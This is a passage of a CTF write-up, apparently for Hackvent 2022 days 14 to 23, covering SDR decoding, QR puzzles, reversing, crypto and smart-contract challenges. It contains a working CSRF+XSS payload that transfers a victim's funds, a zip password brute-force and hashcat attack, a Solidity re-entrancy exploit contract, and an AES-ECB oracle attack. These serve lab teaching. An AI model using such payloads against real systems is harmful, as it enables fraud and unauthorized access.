And indeed, there was a http request shortly after I "opened my support ticket".

Cool - but how do I get the support elf to transfer money to me? An Cross-Site Scripting (XSS) vulnerability would be handy for this... The Cross-Site Request Forgery (CSRF) vulnerability was already given (since there was no anti-CSRF token present).

Searching through the webapp, I discovered an XSS vulnerability on the transfer page where the destination account was reflected if it was invalid.

With this, I was able to create the following payload returned from my "server" run via netcat (`nc -l 1234`), abusing the CSRF and XSS vulnerabilities in the web application:
1. As soon as the document was loaded, a POST request was sent to the `/transfer` endpoint including an invalid destination account.
2. The invalid destination account exploited the XSS vulnerability and executed a script with the following steps in the context of the support elf.
3. Extract the support elf's account number from the main page.
4. Create a transfer request by setting up a form data structure including my account as a target account.
5. POST request to the `/transfer` endpoint to trigger the transfer of 100$.

Here's the full payload:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 994
Server: ludus

<html>
<body onload='document.CSRF.submit()'>
<form action='https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer' method='POST' name='CSRF'>
    <input type='hidden' name='from' value='DC57C6B34ACC1AF505CB'>
    <input type='hidden' name='to' value='asdASDF<script>
        (async() =>{
            let text  = await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/").then((r) => r.text());
            let regex = /([0-9A-F]{20})/;
            let srcAccount = regex.exec(text)[0];
            let formData = new FormData();
            formData.append("from", srcAccount);
            formData.append("to", "DC57C6B34ACC1AF505CB");
            formData.append("amount", "100");
            await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer", {"method": "POST", "body": formData, "credentials": "include"});
        })();
        </script>'>
    <input type='hidden' name='amount' value='100'>
</form>
</body>
</html>
```

And we got that promotion code!

![Promotion code](../dec14/dec14-promotion.png)

### Links
- https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#how-to-test

### Flag
```
HV22{XSS_XSRF_TOO_MANYS_XS}
```
## [HV22.15] Message from Space

<table>
  <tr>
    <th>Categories</th>
    <td>Wireless, Forensic</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>cbrunsch</td>
  </tr>
</table>

### Description
One of Santa's elves is a bit of a drunkard and he is incredibly annoyed by the banning of beer from soccer stadiums. He is therefore involved in the "No Return to ZIro beer" community that pledges for unrestricted access to hop brew during soccer games. The topic is sensitive and thus communication needs to be top secret, so the community members use a special quantum military-grade encryption radio system.

Santa's wish intel team is not only dedicated to analyzing terrestrial hand-written wishes but aims to continuously picking up signals and wishes from outer space too. By chance the team got notice of some secret radio communication. They notice that the protocol starts with a preamble. However, the intel team is keen to learn if the message is some sort of wish they should follow-up. Can you lend a hand?

### Solution
A Software-Defined Radio (SDR) challenge, yay! My turf - or not o_0.

The provided `cu8` file seemed to contain "complex unsigned 8" data sampled at 1 mega-samples per second (hence 1msps in the file name).

Since I had GNU Radio Companion (GRC) installed on my machine, I researched on how to open and process cu8 files with it. Not much luck, though... 

I decided to load the cu8 file in Audacity (as it seems to be able to open this kind of "raw data" files) and convert it to a `wav` file, which was readable by GRC ([see here](https://github-wiki-see.page/m/merbanan/rtl_433/wiki/View-a-saved-cu8-file)).

Subsequently, I processed the signal in GRC with the following flowgraph:

![GRC flowgraph](../dec15/dec15-flowgraph.png)

Finally, I post-processed the binary data with a [custom script](../dec15/nrzi.py) to decode the differential "non-return to zero inverted" encoding of the signal.

```python
##!/usr/bin/env python
lst = "000000101010[...]" # the binary output from GRC in ASCII form (use CyberChef, for example.)


out = ""
prev = ''
for i in lst:
    if prev == '':
        prev = i
    else:
        if i == prev:
            out += '0'
            prev = i
        else:
            out += '1'
            prev = i

print(out)

## Prints:
## 000001111111111111[...]
## Decoded part includes: "SFYyMnt2LXdpc2gtdi1nMHQtYjMzcn0=" after the 0xFFFF preamble.
## Base64 decodes to "HV22{v-wish-v-g0t-b33r}"
```


#### Links
- NRZI: https://en.wikipedia.org/wiki/Non-return-to-zero
- Inspectrum (would have been a good tool for this): https://github.com/miek/inspectrum
- How to use inspectrum (shared by bread): https://youtu.be/M6vUJbav1VE
- Universal radio hacker (would have been an even better tool for this): https://github.com/jopohl/urh

### Flag
```
HV22{v-wish-v-g0t-b33r}
```
## [HV22.16] Needle in a qrstack

<table>
  <tr>
    <th>Categories</th>
    <td>Fun</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>dr_nick</td>
  </tr>
</table>

### Description

Santa has lost his flag in a qrstack - it is really like finding a needle in a haystack.

Can you help him find it?

### Solution
In the [provided image (which is very large)](../dec16/haystack.png) a big QR code is composed by many (as in "a lot of") smaller QR codes at different scales.

To find the needle (the QR code containing the flag) in the haystack (the bunchof QR codes), I tried to disqalify wrong QR codes in an as lightweight way as possible.

To do so, I followed this algorithm:
1. Scan top left to top right for QR codes the size of one unit.
2. Test for whether the region at hand is a QR code. It is if it has a target (the recogniseable square on QR codes) in the top-left or bottom right corner.
3. If it is a QR code, compare it - unit by unit - to a wrong QR code and disqualify it, if equal. Later, I optimised this to only compare the sum of white pixels in the QR code.
4. If it is a QR code and does not match the wrong QR code, it is the QR code containing the flag. Stop the process at that point.
5. If it is not a QR code, it's either completely white (skip it in that case) or multiple QR codes at a deeper level. In the latter case, we would recurse and start from the beginning one level deeper.

See [my code(in python)](../dec16/dec16-solver.py) for the final solution. It runs through in about 40 seconds max.

The QR code containing the flag looks as follows (and I don't know where exactly it's located in the initial image ;) ):

![QR code containing the flag](../dec16/flag_scaled.png)

### Flag
```
HV22{1'm_y0ur_need13.}
```
## [HV22.17] Santa's Sleigh

<table>
  <tr>
    <th>Categories</th>
    <td>Reverse Engineering, Forensic</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>dr_nick</td>
  </tr>
</table>

### Description
As everyone seems to modernize, Santa has bought a new E-Sleigh. Unfortunately, its speed is limited. Without the sleight's full capabilities, Santa can't manage to visit all kids... so he asked Rudolf to hack the sleigh for him.

I wonder if it worked.

Unfortunately, Rudolph is already on holiday. He seems to be in a strop because no one needs him to pull the sledge now. We only got this raw data file he sent us.

#### Hints
- Rodolph is heavy on duty during his holiday trip, but he managed to send und at least a photo of his first step.

[![Hint 1](../dec17/3f256b4c-ea03-4239-957c-b730ae0994f4_scaled.jpg)](../dec17/3f256b4c-ea03-4239-957c-b730ae0994f4.jpg)

- Rudolf finally wants some peace and quiet on vacation. But send us one last message together with a picture: "I thought they speak 8 or 7 N1"


### Solution
Initial reaction: 🤷

The second hint pointed towards a software called [PulseView](https://sigrok.org/wiki/PulseView).

With this software I was able to open the [provided file](../dec17/SantasSleigh.raw).

Next:
- Open the `raw` file in PulseView via "import raw binary logic data".
- Configure 8 logic channels.
- Set a sample rate: 4800  # This was guessed based on seeing that many states occurred ~4 times in a row.

- Decode signal with UART decoder (channels 0 + 1) as explained [here](https://sigrok.org/wiki/Protocol_decoder:Uart).

Configure the UART decoder: 
- Baud rate: 1200
- Data bits: 7
- Parity: none
- Stop bits: 1
- Bit order: lsb-first
- Invert: no

Without setting the sample rate initially (or leaving it at 0), the decoder would fail. In that case, PulseView has a "Logging" tab in the settings (the error would say `SamplerateError: Cannot decode without samplerate.`).

The hint "I thought they speak 8 or 7 N1" refers to 8 bits or 7 bits with no parity and 1 stop bit.

### Links
- https://www.creationfactory.co/2021/12/reverse-engineering-laotie-ti30-scooter.html
- https://github.com/teixeluis/escooter-lcd-esc-decode
- Sigrok PulseView: https://sigrok.org/wiki/Downloads

### Flag
```
HV22{H4ck1ng_S4nta's_3-Sleigh}
```
## [HV22.18] Santa's Nice List

<table>
  <tr>
    <th>Categories</th>
    <td>Crypto</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>keep3r</td>
  </tr>
</table>

### Description

Santa stored this years "Nice List" in an encrypted zip archive. His mind occupied with christmas madness made him forget the password. Luckily one of the elves wrote down the SHA-1 hash of the password Santa used.

```
xxxxxx69792b677e3e4c7a6d78545c205c4e5e26
```

Can you help Santa access the list and make those kids happy?

### Solution

Start investigating the [provided zip file](../dec18/nice-list.zip), which seems to be encrypted.

`exiftool -a nice-list.zip` results in "Zip compression: unknown (99)".

[RedHat says](https://access.redhat.com/solutions/59700) this is compressed with WinZip and AES encrypted.

[This article from bleepingcomputer.com](https://www.bleepingcomputer.com/news/security/an-encrypted-zip-file-can-have-two-correct-passwords-heres-why/) says, long passwords (>64 characters) get hashed with SHA-1 and then, the hash is used as a password and to derive an encryption key (shared by `Wulgaru` in the CTF channel on Discord).

This made me realise that the provided hash part in the challenge description are actually printable chars:
```
69792b677e3e4c7a6d78545c205c4e5e26 => iy+g~>LzmxT\ \N^&
```

The initial approach was to brute force the remainder of the password:
```
SYMBOLS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\-_\~\^\.:,;<>°\+\"\*ç%\&\\/\(\)=?\`\|\@\#¬¢\[\]\{\}"
KNOWN_SUFFIX='iy+g~>LzmxT\ \N^&'
for (( i=0; i<${#SYMBOLS}; i++ )); do
    for (( j=0; j<${#SYMBOLS}; j++ )); do
        for (( k=0; k<${#SYMBOLS}; k++ )); do
            ONE="${SYMBOLS:$i:1}"
            TWO="${SYMBOLS:$j:1}"
            THREE="${SYMBOLS:$k:1}"
            echo "Trying: ${ONE}${TWO}${THREE}${KNOWN_SUFFIX}"
            7z x -aoa -bb0 -p"${ONE}${TWO}${THREE}${KNOWN_SUFFIX}" nice-list.zip flag.txt >/dev/null 2&>1
            [[ "$?" == "0" ]] && echo "Found: ${ONE}${TWO}${THREE}" && exit
        done
    done
done

```

But that took a too long time. So I started to crack the password hash in parallel.

Extract password hash from `nice-list.zip` with `zip2john` or an [online tool](https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php).

Password hash:
```
$zip2$*0*3*0*e07f14de6a21906d6353fd5f65bcb339*5664*41*e6f2437b18cd6bf346bab9beaa3051feba189a66c8d12b33e6d643c52d7362c9bb674d8626c119cb73146299db399b2f64e3edcfdaab8bc290fcfb9bcaccef695d*40663473539204e3cefd*$/zip2$
```

Run hashcat:
```
$ hashcat -m 13600 -a 3 zip_hash -o password.txt '?b?b?biy+g~>LzmxT\ \N^&'
```

CLI options:
- `-m 13600`: WinZip attack mode
- `-a 3`: Brute force
- `zip_hash`: File containing the above hash
- `-o password.txt`: Where to write the password to
- `?b?b?biy+g~>LzmxT\ \N^&`: The mask including the known password part (?b is for a binary charset, 0x00-0xff)

Found password: 
```
4Ltiy+g~>LzmxT\ \N^&
```

Extract files from archive and read flag.txt.

### Links
- https://hashcat.net/forum/thread-7794.html
- https://www.bleepingcomputer.com/news/security/an-encrypted-zip-file-can-have-two-correct-passwords-heres-why/
- https://hashcat.net/wiki/doku.php?id=hashcat

### Flag
```
HV22{HAVING_FUN_WITH_CHOSEN_PREFIX_PBKDF2_HMAC_COLLISIONS_nzvwuj}
```
## [HV22.19] Re-Entry to Nice List 2

<table>
  <tr>
    <th>Categories</th>
    <td>Exploitation</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
The elves are going web3! Again...

After last years failure where everybody could enter the nice list even seconds before christmas, Santa tasked his elves months before this years event to have finally a buy-in nice list that is also secure. To get the most value out of this endavour, they also created a new crypto currency with their own chain :O The chain is called SantasShackles and the coin is called SANTA.

Try to enter the nice list and get the flag!

### Solution
The provided web service looks as follows:

![Nice list v2 page](../dec19/dec19-page.png)

The two provided contracts can be found here:
- [NiceListV2.sol](../dec19/NiceListV2.sol)
- [SantaCoin.sol](../dec19/SantaCoin.sol)

So the goal was to get onto the nice list by bumping my credit amount to 100 SANTA somehow and buy in.
To do so, I had to find 98.5 SANTA somewhere since my current credit was at 1.5 ETH/SANTA only.

As the name of the challenge already hints, a re-entrancy bug needs to be abused to get the required buy in amount.

The "last years failures" refers to previous Hackvent challenges, such as [Re-entry to Nice list in Hackvent 2021](https://sigterm.ch/?p=1696#HV2121_Re-Entry_to_Nice_List).

After struggling quite a lot with understanding the setup and relationships between contracts, SANTA and ETH, I finally managed to mentally parse the material :).

#### The path forward
To get the 100 SANTA in order to buy in to the nice list, we need to exploit the re-entrancy bug on the `NiceListV2.sol` contract.
More concretely, the contract does not protect the functions `withdrawAsEther` and `withdrawAsCoins` the same.
Namely, the `nonReentrant` clause is missing on the `withdrawAsCoins` function.

Therefore, we can invoke `withdrawAsEther` from a specially crafted contract and equip the `receive` function such that `withdrawAsCoins` is called before `withdrawAsEther` returns.

This core part of the exploit looks as follows in the [attacking contract named LudusContract](../dec19/LudusContract.sol):

```solidity
function withdraw(uint amount) public {
    niceList.withdrawAsEther(amount);
}

receive() external payable{
    if (msg.sender != owner){
        niceList.withdrawAsCoins(msg.value);
    }
}
```

Around this, we had to do some logistics to convert from ETH to SANTA coins, approve amounts, buyIn, etc.

In the end, using the attacking contract, I had to run the following manual operations:

1. Create an instance of `LudusContract` along with references to `NiceListV2` and `SantaCoin` and transfer 1.2 ETH to it.
2. Run the `exploit` function on `LudusContract` with parameters
    - `amount` = 1 ETH
    - `loops` = 20

At this point, the contract will have balances of ~1 ETH and 20 SANTA.

3. Repeat the same transaction 4 more times (for some reason, doing the loop 100 times breaks something and the system becomes unresponsive).

4. Invoke the `gimme` function on `LudusContract` to transfer 100 SANTA to my address.
5. Approve the `NiceListV2` contract as a spender of 100 SANTA on my behalf on the `SantaCoin`.
6. Buy in on 100 SANTA to `NiceListV2`.

At this point, invoking the `isNice` function on the `NiceListV2` contract should return true and I could go back to the "Nice Validator" web UI and click the `Am I Nice?` button, displaying the flag 🎉

![Nice you are indeed](../dec19/dec19-flag.png)

### Notes
A few useful notes:

- "payable function": The keyword payable allows someone to send ether to a contract and run code to account for this deposit. In summary, a payable function is a function that can receive ether. It provides the developer with the opportunity to respond to an ether deposit for record-keeping or any additional necessary logic. (source: https://docs.alchemy.com/docs/solidity-payable-functions)
- 1 ETH is 10^18 Wei (or 1000000000000000000)
- Web3.py has the function `Web3.toWei(1, "ether")` to convert between Weis and ETH.


### Links
- https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/ (from mcia)


### Flag
```
HV22{__N1c3__You__ARe__Ind33d__}
```
## [HV22.20] § 1337: Use Padding 📝

<table>
  <tr>
    <th>Categories</th>
    <td>Crypto</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>kuyaya</td>
  </tr>
</table>

### Description
Santa has written an application to encrypt some secrets he wants to hide from the outside world. Only he and his elves, who have access too all the keys used, can decrypt the messages 🔐.

Santa's friends Alice and Bob have suggested that the application has a padding vulnerability❗, so Santa fixed it 🎅. This means it's not vulnerable anymore, right❗❓

Santa has also written a concept sheet of the encryption process: 

![Alice and Bob](../dec20/18ea12cd-8ac2-4106-a00b-a3075d90d2a8.png)

Source file of the service listening on the socket: [santa_aes_source.py](../dec20/santa_aes_source.py)

### Solution
For this challenge, it was pretty clear that we had to attack the electronic code book (ECB) block cipher mode of operation of AES being used.

In the source code there were the following lines:
```python
...
enc = pad(msg) + pad(flag)
enc = aes.encrypt(pad(enc.encode()))
...
```
Given this is a python3 programme, the two first invocations of `pad(...)` were done passing `str` objects and the third one passing a `bytes` object.

This is different, since UTF-8 characters can be encoded in a single or multiple bytes.

Here's an example:
```python
print(len("𐀀"))             # prints 1
print(len("𐀀".encode()))    # prints 4

## Similarly:
print(len("⤀".encode()))    # prints 3
print(len("ü".encode()))    # prints 2
print(len("a".encode()))    # prints 1
```

It is with these 4 characters that I worked subsequently to attack the encryption service. I found them using the [UTF-8 character table](https://www.utf8-chartable.de/unicode-utf8-table.pl).

As described in [this](https://tripoloski1337.github.io/crypto/2020/07/12/attacking-aes-ecb.html) or [this](https://yidaotus.medium.com/breaking-ecb-by-prepending-your-own-message-b7b376d5efbb) article, we can attack AES-ECB if we can control text that is prepended to the actual ciphertext we want to know.

An additional complexity that did not appear in the listed articles is, that in our case, strings were padded to the size of a block before being concatenated and encrypted.

Therefore, we had to work around this padding as follows.

The input string is divided into 4 parts:
- the prefix
- the known secret (the flag)
- the character to find
- the suffix to which the acutal secret will be appended to. 

Submit an input string that follows these constraints:
- The input *string* has length of one or multiple blocks (typically 32 characters)
- The prefix + the known secret + the character to find expand (in *bytes*) to a size of one or multiple blocks (typically 32 bytes).
- The suffix is chosen, so that the secret text is prefixed with the same bytes and so that the previous two constraints are fulfilled.
- The suffix should expand to `N` bytes, where `N` is 32 bytes (2 blocks) minus the length of the known secret minus 1, for the character being brute-forced.

With this, we know that we have guessed the right character if there are two blocks that are identical in the cipher text (the main weakness of AES-ECB).

An example:

```
## Input:
⤀𐀀𐀀üüüüüüüüHV22{üaaaaaüüüüüüüüüü    # 32 characters
            HV22                     # The known secret (4 bytes)
                {                    # The character being brute-forced (1 byte)

⤀𐀀𐀀üü[ü]                            # Block 1: 16 bytes (in 5.5 characters)
      [ü]üüüüHV22{                   # Block 2: 16 bytes (in 9.5 characters)
                 üaaaaaüüüüüüüüüü    # Suffix: (32-4-1=) 27 bytes (in 16 characters)
                 üaaaaaüüüü[ü]       # Block 3: 16 bytes 
                           [ü]üüüüü  # Block 4: 11 bytes, leaving space for the 5 first chars of the secret.

## Encrypted output:
93bf5f8d6cbb8f6f058e60d927910bc9
0b747efd0a676df64ab65a27a2390bec  # Block 2 containing "[ü]üüüüHV22{"
e94f96d4bba3a7d2c764ecd37c8e560e
0b747efd0a676df64ab65a27a2390bec  # Block 4 is identical to block 2!
985f136077c09966e681a0e433b63b45
16e83610eb739f6c474497e599172497


## Conclusion:
The brute-forced character is "{", since the second and the 4th block are identical.
```

With this approach, I brute-forced character by character using a half-manual, half-programmed approach. See my [solver](../dec20/dec20-solver.py) for details.

### Links
- https://yidaotus.medium.com/breaking-ecb-by-prepending-your-own-message-b7b376d5efbb
- https://tripoloski1337.github.io/crypto/2020/07/12/attacking-aes-ecb.html
- https://www.utf8-chartable.de/unicode-utf8-table.pl

### Flag
```
HV22{len()!=len()}
```
## [HV22.21] Santa's Workshop

<table>
  <tr>
    <th>Categories</th>
    <td>Exploitation</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>0xi</td>
  </tr>
</table>

### Description
Santa decided to invite you to his workshop. Can you find a way to pwn it and find the flag?

[File](../dec21/santasworkshop.elf).

### Solution
None. Did not solve.

### Flag
```
-
```
## [HV22.22] Santa's UNO flag decrypt0r

<table>
  <tr>
    <th>Categories</th>
    <td>Reverse engineering</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>leet</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>explo1t</td>
  </tr>
</table>

### Description
The elves made Santa a fancy present for this Christmas season. He received a fancy new Arduino where his elves encoded a little secret for him. However, Santa is super stressed out at the moment, as the children's presents have to be sent out soon. Hence, he forgot the login, the elves told him earlier. Can you help Santa recover the login and retrieve the secret the elves sent him?

### Solution
An [Arduino AVR8 binary](../dec22/unoflagdecryptor.elf) is provided.

I opened the binary in Ghidra and reversed the main function.

It read in some password and XORed the password against some hardcoded data in the binary (under the `flags` label).

To get the password, the following validation procedure was derived from the disassembled and sometimes decompiled code (although the decompilation was only useful to see the high lines of the control flow):

```
X = W           # Read one character on the input
X = X + 0x250   # Add 0x250 to X % 0xd
Xlo = *X        # Read data at address X + 0x250 into X
Xhi = 0
X = X + 0x133 + 0x25 = X + 0x158 
Wlo = *X        # Read data at address X + 0x158 into Wlo
```


Memory at `0x250 + (X % 0xd)` as read in:
```
05 5c 03 07 0d 00 3c c8 2b 14 43 31 a5
05 5c 03 07 0d 00 3c c8 2b 14 43 31 a5
05 5c 03 07 0d 00 3c
```
If we add `0x158` to these values, we end up with the following hex values:
```
15d 1b4 15b 15f 165 158 194 220 183 16c 19b 189 1fd
15d 1b4 15b 15f 165 158 194 220 183 16c 19b 189 1fd
15d 1b4 15b 15f 165 158 194
```
If we look up the values at these addresses, we get:
```
f3 b6 28 48 06 41 fc 0e 02 08 10 f5 6a
f3 b6 28 48 06 41 fc 0e 02 08 10 f5 6a 
f3 b6 28 48 06 41 fc
```

Finally, the input password was XORed with the data from the computation above, which had to result in the following sequence of bytes:
```
80 d7 46 3c 67 7b 95 51 6e 67 66 90 35 9b d7 5a 2c 65 71 98 6b 66 57 73 87 59 97 cc 09 69 27 7b d5
```

Taking [the XOR of these two values](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'80%20d7%2046%203c%2067%207b%2095%2051%206e%2067%2066%2090%2035%209b%20d7%205a%202c%2065%2071%2098%206b%2066%2057%2073%2087%2059%2097%20cc%2009%2069%2027%207b%20d5'%7D,'Standard',false)&input=ZjMgYjYgMjggNDggMDYgNDEgZmMgMGUgMDIgMDggMTAgZjUgNmEgZjMgYjYgMjggNDggMDYgNDEgZmMgMGUgMDIgMDggMTAgZjUgNmEgZjMgYjYgMjggNDggMDYgNDEgZmM) gives us the expected password:
```
santa:i_love_hardc0ded_cr3dz!!!:)
```

Finally, we XOR this with the data at `flags`:
```
3b 37 5c 46 1a 54 58 3c 5f 30 04 56 29 5b 13 47 55 0d 06 3b 50 0f 6e 0f 1e 49 3b 0f 7e 46 11 0d 54
```

...which returns the flag.

See [how it's done in CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto'/disabled)XOR(%7B'option':'Hex','string':'3b%2037%205c%2046%201a%2054%2058%203c%205f%2030%2004%2056%2029%205b%2013%2047%2055%200d%2006%203b%2050%200f%206e%200f%201e%2049%203b%200f%207e%2046%2011%200d%2054'%7D,'Standard',false)&input=c2FudGE6aV9sb3ZlX2hhcmRjMGRlZF9jcjNkeiEhITop).


### Flag
```
HV22{n1c3_r3v3r51n6_5k1llz_u_g07}
```
## [HV22.23] Code but no code

<table>
  <tr>
    <th>Categories</th>
    <td>Reverse engineering</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>leet</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
Santa loves puzzles and hopes you do too ;) Find the secret inputs which fulfil the requirements and gives you the flag.

### Solution
The challenge is served as a small web service, seemingly distributing Santa's dedicated signatures and validating whether we (the one holding the private key) have solved the challenge.

![Santa's signatures](../dec23/dec23-page.png)

Via that page, we can download two Solidity contracts:
- [Setup.sol](../dec23/Setup.sol)
- [Challenge.sol](../dec23/Challenge.sol)

While `Setup.sol` simply deploys `Challenge.sol`, the latter gives more usable hints.

```solidity
function solve(
    address helper,
    bytes memory sig,
    bytes calldata message
) external {
    for (uint256 i = 0; i < 19; i++) {
        require(bytes20(helper)[i] == 0, "helper has not enought 0s");
    }

    bytes32 r;
    bytes32 s;
    uint8 v = 28;
    assembly {
        // first 32 bytes, after the length prefix
        r := mload(add(sig, 32))
        // second 32 bytes
        s := mload(add(sig, 64))
    }

    (bool success, bytes memory result) = helper.call(
        abi.encode(keccak256(message), v, r, s)
    );
    require(success, "helper call failed");
    require(bytes32(result) == bytes32(uint256(uint160(signer))), "Wrong Signer!");
    solved = true;
}
```

It seems that we need to pass a helper address that starts with 19 zeros. Knowing that a usual address is composed by 20 bytes, there's not much left to work with - but enough, as we'll see.

Next, there's this `v` value that's hardcoded to 28, which doesn't stand out initially, but will show to be tricky.

Finally, we'll have to make sure that the result from the call to *helper* is equal to the signer address (which is equivalent to the address having created the `Setup` contract).

To summarise, **we want to find the creator of some signature with value `v` set to 28 via the help of a remote contract, which can only be addressed using a one-byte address.**

#### Ecrecover
Let's jump right in with the obvious stuff first: How do get the signer address from a message and its signature?

Ethereum uses the Elliptic Curve Digital Signature Algorithm (ECDSA). Along with [this explanation](https://ethereum.stackexchange.com/a/15774), there's also a (yet insufficient) explanation on the three values `v`, `r` & `s` and how to recover the public key of the signer from these values and the message hash via `ecrecover`.

Perfect, exactly what we need.

In order to validate the single steps, I created my own small contract and invoked the `ecrecover` function from it - no success, though.

Dissecting ECDSA signatures shows, that a signature is the concatenation of `r + s + v` with `r` & `s` being 32 byte values and `v` being a one byte value of either 27 (0x1b) or 28 (0x1c) (other values are possible if I'm not mistaken, but unlikely).

In our case, however, we only ever get signatures with `v = 27` from the provided web UI.
And it seems it is on purpose, as a the initially supplied message seems to have been padded to fulfill this criteria: `test` became `test_` including an underscore suffix.

Yet, the value `v = 28` is hardcoded.

#### Signature malleability
It took another amount of time searching the Internet to learn about **signature malleability** to which signatures created with ECDSA are vulnerable. See here: https://coders-errand.com/malleability-ecdsa-signatures/.

In the second section of the article, it says:

> a valid ECDSA signature `(r, s)` can easily be transformed into a different valid signature, `(r, n - s)` for the same data.

In addition to this, I also skimmed through the [previous article](https://coders-errand.com/ecrecover-signature-verification-ethereum/) to learn more about the theory behind.

In addition, I also stumbled on [EIP-2#Rationale](https://eips.ethereum.org/EIPS/eip-2#rationale) which says, that the `s` part of the signature can be changed, so that `v` is 28 (instead of 27 and vice versa).

To do so, simply compute `Secp256k1.n - s`.

So, let's split up the provided signature into `r, s, v` and compute a new valid signature `r, n - s, 28 + 27 - v`.

Again, I tried to validate this locally, as for this minimal step it had to be possible to be validated.

To make validation work I used the `Web3.py` library and ran the following code (find it in my [dec23-debugger.py script](../dec23/dec23-debugger.py):

```python
## Expected signer: 0xa359fAc1B77084b708554B8154a646a216F8d89e

msg = "test"
sig_str = "0x851f1fa8f7a3af17be486d791570ea32f60a7b0eead3ac4202945870c799d7280136427a8e64662bd66ea23affc0d53372db3f3ab835faa47d92224206786c6c1b"
sig_bytes = bytes.fromhex(sig_str[2:])
## Prints the expected signer.
print(w3.eth.account.recover_message(encode_defunct(text=msg), signature=sig_bytes))

## Convert signature from (r, s) to (r, -s).
(r, s, v) = (sig_bytes[0:32], sig_bytes[32:64], sig_bytes[-1:])
s_int = int.from_bytes(s, "big")
s_prim = (Secp256k1.n - s_int) % Secp256k1.n
s_prim_hex = s_prim.to_bytes(32, 'big')
v_int = int.from_bytes(v, "big")
v_prim = 27 + 28 - v_int
v_prim_hex = v_prim.to_bytes(1, "big")
signature_mod: bytes = r + s_prim_hex + v_prim_hex

## Also prints the expected signer.
print(w3.eth.account.recover_message(encode_defunct(text=msg), signature=signature_mod))
```

"Luckily" `ecrecover` is vulnerable to that signature malleability vulnerability.

#### Precompiled contracts
Next, I focused on the helper contract.
It became clear pretty quickly that providing an own helper contract performing the `ecrecover` operation is a viable approach only if we can address it with an address prefixed by 19 zeros.

Something that's not possible.

The hurdle can be overcome with some (read: a lot of) DuckDuckGo usage (and some hints from fellow hackers, if you don't happen to type in the right words).

After all, we want to learn about **precompiled contracts** ([see here](https://www.evm.codes/precompiled?fork=merge)), which exist at addresses `0x[...]01` - `0x[...]09`.

The contract at `0x00000000000000000001` happens to do precisely the `ecrecover` we're looking for.

#### String encoding for signatures
The final struggle seemed endless. For some reason, I was able to recover the signer locally, but not through a contract, when passing in the message "as is".

It is only when digging a bit deeper into what actually happens when invoking the `encode_defunct(...)` function that [we can see](https://github.com/ethereum/eth-account/blob/v0.8.0/eth_account/messages.py#L229):
1. it returns a `SignableMessage` object.
2. this object contains a peculiar prefix being `\x19Ethereum Signed Message:\n<length>` (the first `\x19` byte is added only later in the process).

The peculiar prefix is actually well defined in [EIP-191](https://eips.ethereum.org/EIPS/eip-191).

In a nutshell, the message `test` becomes before signature:
```
\x19Ethereum Signed Message:\n4test
```

It is only by adding this prefix to the message before hashing that the public key recovery also worked out with contracts. 🎉

#### Conclusion
For this challenge, I wanted to implement the entire solution in python.
You can find the entire script [over here](../dec23/dec23-solver.py).

The following excerpt represents the main function and shows the high level interactions.

```python
ip_addr = socket.gethostbyname(HOST)
print(ip_addr)
w3 = Web3(HTTPProvider(f"http://{ip_addr}:{PORT}"))

account = Account.from_key(PRIVATE_KEY)
print(f"My own account address: {account.address}")
w3.eth.set_gas_price_strategy(gas_price_strategy=lambda w3, o: Web3.toWei(20000000000, "Wei"))
w3.middleware_onion.add(construct_sign_and_send_raw_middleware(account))

r = requests.get(f"http://{HOST}:8080/sign?msg={MESSAGE}")
d = r.json()
msg = d["msg"]
sig_str = d["signature"]
sig_bytes = bytes.fromhex(sig_str[2:])
print(f"Message: {msg}")
print(f"Signature:         {sig_str}")

v = sig_bytes[-1:]
r = sig_bytes[0:32]
s = sig_bytes[32:64]
s_int = int.from_bytes(s, "big")
s_prim = (Secp256k1.n - s_int) % Secp256k1.n

s_prim_hex = s_prim.to_bytes(32, 'big')

signature_mod: bytes = r + s_prim_hex + v

print(f"Changed signature: 0x{signature_mod.hex()}")

challenge_address = find_challenge_address(w3)
invoke_challenge(w3, challenge_address, encode_defunct(text=msg), signature_mod, account.address)

check_solved(w3)
```

### Notes
#### Elliptic curve base equation
```
y^2 = x^3 + ax + b
```

#### How ecrecover works
If a point `P = (x, y)` is on the curve, so is a point `P' = (x, -y)`. "This means we always have more than one valid signature."

A signature can be accepted if `x1 == r mod n`. Since `X = (x1, y1)` and `-X = (x1, -y1)` have the same `x1`, two signatures are possible.

Compute point `X`:
```
X = (eG + rQ) / s mod n. 
```

`e`: hash(`m`).
`G`: Generator point, the base point for the elliptic curve. (given)
`r`: Part of the signature.
`Q`: Public key.
`s`: Part of the signature.
`n`: The modulo constant of the curve (given)

`-X` can be computed by changing the sign of `s`. That means that if `(r, s)` is valid, so is `(r, n - s)` under modulo `n`.

To recover the public key `Q`, we can change the equation as follows:
```
Q = (sX - eG) / r mod n
```
